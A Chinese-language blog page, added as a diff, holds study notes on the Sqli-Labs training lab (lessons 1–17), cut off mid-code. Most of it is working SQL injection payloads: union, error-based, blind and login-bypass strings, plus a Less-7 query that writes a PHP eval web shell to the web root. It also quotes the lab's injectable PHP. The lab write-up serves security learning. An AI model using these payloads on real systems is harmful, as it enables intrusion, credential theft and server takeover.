@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    <meta name="keywords" content="Hexo | John Doe">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Sqli-Labs Study · Nancy&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/pic1.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Nancy&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Sqli-Labs Study</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Nancy's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Sqli-Labs Study
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL">SQL</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">3,037</span> / Reading time: <span class="post-count">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/08/31</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Sqli-Labs注入学习笔记"><a href="#Sqli-Labs注入学习笔记" class="headerlink" title="Sqli-Labs注入学习笔记"></a>Sqli-Labs注入学习笔记</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>Ubuntu16.04+apache2+php5.6+mysql5.7</p>
+</blockquote>
+<p><a href="https://www.jianshu.com/p/091f5dfa408d" target="_blank" rel="noopener">关于平台搭建的相关教程戳这里</a></p>
+<p>搭建完成后进入<code>localhost/sqli-labs-master</code>，点链接看到map</p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/1.jpg" alt=""></p>
+<p>再点Less-1，如果出现如下页面说明数据也已搭建完毕。</p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/2.jpg" alt=""></p>
+<p>现在可以开始进行注入的学习了</p>
+<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><blockquote>
+<p>GET-Error based-Single quotes-String</p>
+</blockquote>
+<p><code>localhost/sqli-labs-master/Less-1/?id=1&#39;</code>出现报错：<strong>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use  near ‘’1’’ LIMIT 0,1’ at line 1</strong> 发现已经闭合，直接加注释符即可注入。</p>
+<p><code>?id=1&#39; order by 2--+</code>，<code>?id=1&#39; order by 3--+</code>均正常回显，<code>order by 4</code>报错，说明有三列。</p>
+<p><code>?id=-1&#39; union select database(),2,3--+</code>发现回显为在2,3处，<code>?id=-1&#39; union select 1,database(),3--+</code>得库名security</p>
+<p><code>?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&quot;security&quot; limit 0,1--+</code>改变limit范围共得到emails,referers,uagents,users四个表名。</p>
+<p>还有一种更简单的办法：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
+<p><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;--+</code>同理得到id,username,password三个字段名。</p>
+<p><code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code>得到十三组用户名密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><blockquote>
+<p>GET-Error based-integer based</p>
+</blockquote>
+<p><code>?id=1&#39;</code>报错：<strong>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near ‘’ LIMIT 0,1’ at line 1 </strong> 发现这个已经闭合过了，再加一个单引号就会多出来。</p>
+<p>所以同理直接构造<code>id=-1 union select 1,username,password from users limit 0,1--+</code></p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><blockquote>
+<p>GET-Error based-Single quotes with twist-String</p>
+</blockquote>
+<p><code>?id=1&#39;</code>报错：<strong>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near ‘’1’’) LIMIT 0,1’ at line 1</strong> 后面多了个括号。构造：<code>?id=1&#39;)</code></p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote>
+<p>GET-Error based-Double quotes-String</p>
+</blockquote>
+<p><code>?id=1&#39;</code>不报错，<code>?id=1&quot;</code>报错：<strong>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near ‘“1″”) LIMIT 0,1’ at line 1</strong>  构造：<code>?id=1&quot;)</code></p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><blockquote>
+<p>GET-Double injection-Single quotes-String</p>
+</blockquote>
+<p><code>?id=1</code>这次的页面和之前不太一样，没有出现回显位，所以不能像前几次那样构造了。</p>
+<p>可以先看一下这篇博文：<a href="https://www.cnblogs.com/lcamry/p/5763129.html" target="_blank" rel="noopener">MYSQL注入天书之盲注讲解</a></p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/3.jpg" alt=""></p>
+<p><code>?id=1&#39;</code>这里报错和Less-1里面的一样。</p>
+<p>题目提示双注入：<a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">先了解一下</a></p>
+<p>先查库名：<code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(database()),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code>回显<code>Duplicate entry &#39;~security~1&#39; for key&quot;</code></p>
+<p>也可以用extravalue报错的方法：<code>?id=-1&#39; and extravalue(1,concat(0x7e,(select database()),0x7e))--+</code>回显<code>FUNCTION security.extractvalue does not exist</code></p>
+<p><code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code> 回显<code>Duplicate entry &#39;~emails~0&#39; for key&quot;</code></p>
+<p><code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code>回显<code>Duplicate entry &#39;~users~1&#39; for key&quot;</code></p>
+<p>直接查四个表的方法：<code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(table_name)) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+</code></p>
+<p>查users表列名：<code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(column_name)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+</code></p>
+<p>查数据：<code>?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),&#39;~&#39;,floor(rand()*2))a  from information_schema.tables group by a--+</code> </p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><blockquote>
+<p>GET-Double injection-Double quotes-String</p>
+</blockquote>
+<p><code>?id=1&#39;</code>不报错，<code>?id=1&quot;</code>报错：<strong>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near ‘“1”” LIMIT 0,1’ at line 1</strong> ，把Less-5的payload中的单引号换成双引号即可。</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><blockquote>
+<p>GET-Dump into outfile-String</p>
+</blockquote>
+<p><a href="https://www.jb51.net/article/139858.htm" target="_blank" rel="noopener">先了解一下dumpfile的用法</a> 还有 <a href="https://www.cnblogs.com/ximotao/p/5847595.html" target="_blank" rel="noopener">SQL注入写入一句话木马原理</a></p>
+<p>首先要获取网站在系统中的具体路径，利用@@datadir (数据库路径) 和@@basedir (MYSQL安装路径)。</p>
+<p>在Less-1注入得到数据库路径/var/lib/mysql/，安装路径/usr/</p>
+<p>试了<code>?id=1&#39;</code>、<code>?id=1&quot;</code>、<code>?id=1&#39;)</code>都不行，去看了下源码，发现用的双括号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p><code>?id=-1&#39;)) union select 1,2,3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e into outfile &#39;/var/www/html/cmd.php&#39;--+</code> ，这里的<code>3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e</code> 是<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>的十六进制。最后再用菜刀连接。</p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><blockquote>
+<p>GET-Blind-Boolean based-Single quotes</p>
+</blockquote>
+<p>基于布尔的盲注，可以借助substr()，left()，mid()等其他函数判断。</p>
+<p>1.从左开始截取字符串：left(str, length)，即left(被截取字符串， 截取长度)</p>
+<p>2.从右开始截取字符串：right(str, length)，即right(被截取字符串， 截取长度)</p>
+<p>3.截取特定长度的字符串：</p>
+<ul>
+<li><p>substring(str, pos)，即：substring(被截取字符串， 从第几位开始截取)</p>
+</li>
+<li><p>substring(str, pos, length)，即：substring(被截取字符串，从第几位开始截取，截取长度)</p>
+</li>
+<li><p>从字符串的倒数第6个字符开始读取，只取2个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(&apos;helloworld&apos;, -6, 2)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>4.按关键字进行读取：substring_index(str, delim, count)，即substring_index(被截取字符串，关键字，关键字出现的次数)</p>
+<ul>
+<li><p>截取第二个“.”之前的所有字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>截取倒数第二个“.”之后的所有字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, -2);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果关键字不存在，则返回整个字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;#&apos;, 1);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>试着查库名：<code>?id=1&#39; and substr(database(),1,1)&gt;&#39;a&#39;--+</code>，若回显you are in说明库名的第一个字符在a之后，然后手工一个一个试就能试出第一个字符是啥，同理就可以试出整个库名。当然这样试很麻烦，用脚本跑会快很多。</p>
+<p>类似地，构造<code>?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)1,1)&gt;&#39;a&#39;--+</code>可以试出表名。</p>
+<p>或者利用ascii()和substr()函数构造：<code>?id=1&#39; and ascii(substr((select database()),1,1))&gt;33--+</code></p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><blockquote>
+<p>GET-Blind-Time bases-Single quotes</p>
+</blockquote>
+<p>基于时间的盲注：<a href="http://www.cnblogs.com/ldhbetter/p/9201840.html" target="_blank" rel="noopener">附链接</a></p>
+<p>可以利用if()，sleep()，benchmark()函数进行盲注。</p>
+<ul>
+<li>if(exp1,exp2,exp3)：当exp1为true时，执行exp2；否则执行exp3</li>
+<li>sleep(seconds)：让代码执行延迟若干秒</li>
+<li>benchmark(n,exp)：让表达式exp重复执行n次</li>
+</ul>
+<p>查库名：<code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code>匹配的时候会直接返回，不匹配则需等待5秒。表名、列名、数据信息也可以通过这种方式查出。</p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><blockquote>
+<p>GET-Blind-Time based-Double quotes</p>
+</blockquote>
+<p>将Less-9的payload里的单引号换成双引号即可。</p>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><blockquote>
+<p>POST-Error based-Single quotes-String</p>
+</blockquote>
+<p>变成post了，有俩输入框username和password，猜会用到万能密码。用户名输<code>admin&#39;#</code>密码随便填，回显用户admin登录，可以注入了</p>
+<p>username：<code>&#39; or 1=1 order by 2#</code>回显正确，<code>&#39; or 1=1 order by 3#</code>报错，说明有两列</p>
+<p><code>&#39; union select 1,database()#</code>得库名</p>
+<p><code>&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#</code>得表名，查列名和数据同理。</p>
+<p>（这里都是在username里注入，也可以利用已知的用户名admin在password里添加查询语句）</p>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><blockquote>
+<p>POST-Error based-Double quotes-String-with twist</p>
+</blockquote>
+<p>这里构造方法和Less-11差不多，只需把单引号改成<code>&quot;)</code></p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><blockquote>
+<p>POST-Double injection-Single quotes-String-with twist</p>
+</blockquote>
+<p>查库名：用户名输<code>&#39; or &#39;1&#39;=&#39;1</code>，密码输<code>&#39;) or 1=1 and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code>，报错<code>FUNCTION security.extractvalue does not exist</code></p>
+<p>或者用户名输<code>admin&#39;) and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code>，密码随便输，出现报错<code>XPATH syntax error:&#39;~security~&#39;</code></p>
+<p>查表名：用户名<code>admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e))#</code>，报错<code>XPATH syntax error:&#39;~emails,referers,uagents,users~&#39;</code></p>
+<p>查列名和数据同理。</p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><blockquote>
+<p>POST-Double injection-Single quotes-String-with twist</p>
+</blockquote>
+<p>和Less-13类似，把<code>&#39;)&#39;</code>换成<code>&quot;</code></p>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><blockquote>
+<p>POST-Blind-Boolean/time Based-Single quotes</p>
+</blockquote>
+<p>基于布尔：用户名<code>admin&#39; and substr(database(),1,1)&gt;&#39;a&#39;#</code></p>
+<p>基于时间：用户名<code>admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))#</code></p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><blockquote>
+<p>POST-Blind-Boolean/time Based-Double quotes</p>
+</blockquote>
+<p>把Less-15里的单引号换成<code>)&quot;</code></p>
+<p>附源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">	$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">	@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><blockquote>
+<p>POST-Update Query-Error based-String</p>
+</blockquote>
+<p>关于Update Query：<a href="https://www.cnblogs.com/lcamry/p/5763048.html" target="_blank" rel="noopener">附链接</a></p>
+<p>看下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">	<span 